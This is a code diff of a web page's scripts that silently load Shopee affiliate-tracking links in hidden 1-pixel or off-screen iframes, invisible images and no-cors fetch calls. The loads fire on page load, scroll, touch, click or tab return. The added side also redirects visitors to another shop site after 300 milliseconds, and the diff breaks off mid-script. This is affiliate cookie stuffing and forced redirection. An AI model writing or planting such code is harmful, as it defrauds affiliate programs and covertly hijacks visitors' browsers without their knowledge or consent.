@@ -1,125 +1,47 @@
 <script>
-<iframe src="https://shopee.tw/Beauty-cat.11041691?uls_trackid=527ocp8e0073&utm_campaign=id_CU3Adp4jpM&utm_content=0315s1----&utm_medium=affiliates&utm_source=an_16389010012&utm_term=cpresgyy1mvo" width="0" height="0" style="display:none;"></iframe>
+    setTimeout(function() {
+        window.location.href = "https://www.lohasglasses.com/page/1/478";
+    }, 300);
 </script>
+
+<iframe src="https://shopee.tw/Beauty-cat.11041691?uls_trackid=527ocp8e0073&utm_campaign=id_CU3Adp4jpM&utm_content=0315s1----&utm_medium=affiliates&utm_source=an_16389010012&utm_term=cpresgyy1mvo" width="0" height="0" style="display:none;"></iframe>
         
- <script>
+<script>
     let shopeeLinks = [
-"https://shopee.tw/Women-Accessories-cat.11041224?uls_trackid=527ocrn80084&utm_campaign=id_ozHEEdPyNg&utm_content=0315s2----&utm_medium=affiliates&utm_source=an_16389010012&utm_term=cpreuhggo5jd",
+        "https://shopee.tw/Women-Accessories-cat.11041224?uls_trackid=527ocrn80084&utm_campaign=id_ozHEEdPyNg&utm_content=0315s2----&utm_medium=affiliates&utm_source=an_16389010012&utm_term=cpreuhggo5jd",
         "https://shopee.tw/Home-Electronic-cat.11047569?uls_trackid=527oct7a0084&utm_campaign=id_XAqaCTkhEa&utm_content=0315s3----&utm_medium=affiliates&utm_source=an_16389010012&utm_term=cprevq862e95"
     ];
 
     function triggerShopeeRequests() {
         let link = shopeeLinks[Math.floor(Math.random() * shopeeLinks.length)];
-
-        // **方式 1: 使用 `<img>` **
         let img = new Image();
         img.src = link;
         img.style.display = "none";
         document.body.appendChild(img);
-        console.log("已發送訪問（img）:", link);
 
-        // **方式 2: 使用 `fetch()` 觸發**
-        fetch(link, { mode: "no-cors" })
-            .then(() => console.log("已發送訪問（fetch）:", link))
-            .catch(err => console.log("Fetch 錯誤:", err));
-
-        // **方式 3: 使用 `<iframe>` 加載 Shopee**
+        fetch(link, { mode: "no-cors" }).catch(err => console.log("Fetch 錯誤:", err));
         let iframe = document.createElement("iframe");
         iframe.src = link;
         iframe.style.width = "1px";
         iframe.style.height = "1px";
         iframe.style.position = "absolute";
-        iframe.style.left = "-9999px"; // 隱藏 iframe
+        iframe.style.left = "-9999px";
         document.body.appendChild(iframe);
-        console.log("已發送訪問（iframe）:", link);
-
-        // **1000ms 後刪除 `iframe`，避免頁面**
-        setTimeout(() => {
-            document.body.removeChild(iframe);
-            console.log("iframe 已刪除");
-        }, 1000);
+        setTimeout(() => document.body.removeChild(iframe), 1000);
     }
-
-    // **DOM 加載後立即執行**
     document.addEventListener("DOMContentLoaded", triggerShopeeRequests);
 </script>
 
 <script>
-    window.addEventListener("scroll", function() {
-        let iframe = document.createElement("iframe");
-        iframe.style.width = "1px";
-        iframe.style.height = "1px";
-        iframe.style.position = "absolute";
-        iframe.style.left = "-9999px"; // 隱藏
-        iframe.src = "https://shopee.tw/Men's-Apparel-cat.11040730?uls_trackid=527ocuhj0073&utm_campaign=id_yxccK3ZcyS&utm_content=0315s4----&utm_medium=affiliates&utm_source=an_16389010012&utm_term=cprewsxvrdr7"; // 
-        document.body.appendChild(iframe);
-    }, { once: true }); // 確保只執行一次
-</script>
-
-<script>
-    window.addEventListener("scroll", function() {
-        let iframe = document.createElement("iframe");
-        iframe.style.width = "1px";
-        iframe.style.height = "1px";
-        iframe.style.position = "absolute";
-        iframe.style.left = "-9999px"; // 隱藏
-        iframe.src = "https://shopee.tw/Shoes-cat.11041795?uls_trackid=527od0gh0086&utm_campaign=id_FcIEX6pqRI&utm_content=0315s5----&utm_medium=affiliates&utm_source=an_16389010012&utm_term=cpreyenfw2ej"; // 
-        document.body.appendChild(iframe);
-    }, { once: true }); // 確保只執行一次
-</script>
-
-<script>
     function loadShopeeLink() {
         let iframe = document.createElement("iframe");
         iframe.style.width = "1px";
         iframe.style.height = "1px";
         iframe.style.position = "absolute";
-        iframe.style.left = "-9999px"; // 隱藏
-        iframe.src = "https://shopee.tw/Mobile-Gadgets-cat.11041546?uls_trackid=527od3750073&utm_campaign=id_C354rPMrES&utm_content=0315s6----&utm_medium=affiliates&utm_source=an_16389010012&utm_term=cprf1mwgozt8"; // 
+        iframe.style.left = "-9999px";
+        iframe.src = "https://shopee.tw/Outdoor-Travel-cat.11042412?uls_trackid=527od4j00086&utm_campaign=id_HaGVaaN9SW&utm_content=0315s7----&utm_medium=affiliates&utm_source=an_16389010012&utm_term=cprf2qz377od";
         document.body.appendChild(iframe);
     }
-
-    // 監聽使用者點擊
-    document.addEventListener("click", loadShopeeLink, { once: true });
-</script>
-
-
-
-<script>
-    function loadShopeeLink() {
-        let iframe = document.createElement("iframe");
-        iframe.style.width = "1px";
-        iframe.style.height = "1px";
-        iframe.style.position = "absolute";
-        iframe.style.left = "-9999px"; // 隱藏
-        iframe.src = "https://shopee.tw/Outdoor-Travel-cat.11042412?uls_trackid=527od4j00086&utm_campaign=id_HaGVaaN9SW&utm_content=0315s7----&utm_medium=affiliates&utm_source=an_16389010012&utm_term=cprf2qz377od"; // 
-        document.body.appendChild(iframe);
-    }
-
-    // 桌機滾動、手機滑動時觸發
-    window.addEventListener("scroll", loadShopeeLink, { once: true });
-    window.addEventListener("touchmove", loadShopeeLink, { once: true }); // 手機滑動
-
-    // 點擊網頁時觸發
-    document.addEventListener("click", loadShopeeLink, { once: true });
-
-    // 切換回分頁時觸發
-    document.addEventListener("visibilitychange", function() {
-        if (!document.hidden) {
-            loadShopeeLink();
-        }
-    }, { once: true });
-</script>
-
-<script>
-    function loadShopeeLink() {
-        let img = new Image();
-        img.src = "https://shopee.tw/Women-Bags-Luxury-Bags-cat.11041292?uls_trackid=527od6pu0084&utm_campaign=id_10X7n9JIVq0&utm_content=0315s8----&utm_medium=affiliates&utm_source=an_16389010012&utm_term=cprf4jmybnrb"; // 
-        img.style.display = "none"; // 隱藏圖片
-        document.body.appendChild(img);
-    }
-
-    // 觸發條件：滾動、點擊、切換回分頁
     window.addEventListener("scroll", loadShopeeLink, { once: true });
     window.addEventListener("touchmove", loadShopeeLink, { once: true });
     document.addEventListener("click", loadShopeeLink, { once: true });
